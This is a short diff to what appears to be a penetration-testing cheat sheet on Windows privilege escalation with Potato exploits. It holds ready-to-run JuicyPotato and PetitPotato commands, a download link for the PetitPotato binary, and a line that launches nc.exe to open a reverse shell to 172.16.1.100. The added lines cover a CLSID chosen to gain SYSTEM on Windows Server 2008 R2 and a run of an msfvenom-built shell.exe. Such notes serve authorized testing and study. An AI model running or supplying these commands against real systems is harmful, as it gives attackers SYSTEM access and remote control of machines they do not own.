@@ -63,7 +63,12 @@ https://github.com/wh0amitz/PetitPotato/releases/download/v1.0.0/PetitPotato.exe
 
 .\PetitPotato.exe 3 "whoami"
 
+#. I used a CLSID sourced from **Ohpe’s GitHub repository** (link) specifically for Windows Server 2008 R2 Enterprise, which is known to grant **SYSTEM** privileges.
+
 .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Windows\Temp\priv\nc.exe -e cmd 172.16.1.100 8081"
+
+#Creas una shell.exe con msfvenom
+.\Juicy.Potato.x86.exe -t * -p shell.exe -l 1338 -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
 ```
 
 ## SeBackupPriv
